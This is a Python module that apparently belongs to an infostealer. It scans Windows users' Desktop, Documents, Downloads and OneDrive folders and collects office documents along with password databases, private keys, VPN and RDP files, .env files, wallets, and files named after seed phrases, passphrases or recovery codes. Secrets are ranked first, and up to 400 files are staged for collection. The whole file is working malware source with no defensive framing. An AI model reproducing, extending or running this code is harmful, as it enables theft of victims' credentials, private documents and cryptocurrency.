"""Document and key-material collection from user folders."""

import os

from .util import USERPROFILE

DOC_EXTS = {
    ".pdf",
    ".doc",
    ".docx",
    ".xls",
    ".xlsx",
    ".ppt",
    ".pptx",
    ".csv",
    ".txt",
    ".rtf",
    ".odt",
    ".ods",
    ".odp",
}
SECRET_EXTS = {".kdbx", ".key", ".pem", ".ppk", ".ovpn", ".rdp", ".env", ".wallet"}
SECRET_HINTS = ("seed", "mnemonic", "passphrase", "recovery", "wallet", "backup code", "2fa")
SKIP_DIRS = {
    "appdata",
    "node_modules",
    ".git",
    ".venv",
    "venv",
    "site-packages",
    "__pycache__",
    "windows",
    "program files",
    "program files (x86)",
    "$recycle.bin",
    ".cache",
    "temp",
}


def _roots():
    roots = [
        os.path.join(USERPROFILE, "Desktop"),
        os.path.join(USERPROFILE, "Documents"),
        os.path.join(USERPROFILE, "Downloads"),
    ]
    onedrive = (
        os.environ.get("OneDrive")
        or os.environ.get("OneDriveConsumer")
        or os.environ.get("OneDriveCommercial")
    )
    if onedrive:
        roots += [os.path.join(onedrive, "Desktop"), os.path.join(onedrive, "Documents")]
    return list(dict.fromkeys(root for root in roots if os.path.isdir(root)))


def _wanted(filename, extension):
    if extension in SECRET_EXTS:
        return True
    if extension in DOC_EXTS:
        return True
    lowered = filename.lower()
    return any(hint in lowered for hint in SECRET_HINTS)


def _priority(filename, extension):
    if extension in SECRET_EXTS:
        return 2
    lowered = filename.lower()
    return 2 if any(hint in lowered for hint in SECRET_HINTS) else 1


def extract(stage):
    candidates = []
    seen = set()
    for root in _roots():
        base_depth = root.rstrip("\\").count(os.sep)
        for base, dirs, filenames in os.walk(root):
            if base.count(os.sep) - base_depth >= 3:
                dirs[:] = []
            dirs[:] = [
                entry
                for entry in dirs
                if entry.lower() not in SKIP_DIRS and not entry.startswith(".")
            ]
            for filename in filenames:
                path = os.path.join(base, filename)
                real = os.path.realpath(path)
                if real in seen:
                    continue
                seen.add(real)
                extension = os.path.splitext(filename)[1].lower()
                if not _wanted(filename, extension):
                    continue
                try:
                    size = os.path.getsize(path)
                    mtime = os.path.getmtime(path)
                except OSError:
                    continue
                if size == 0 or size > 8 * 1024 * 1024:
                    continue
                candidates.append((_priority(filename, extension), mtime, path, size))
    candidates.sort(key=lambda item: (item[0], item[1]), reverse=True)

    index = []
    for _, _, path, _ in candidates[:400]:
        if stage.add_file("documents", path, path.replace(":", "")):
            index.append(path)
    stage.add_text(
        "documents", "file_index.txt", "\n".join(index) or "no documents found"
    )
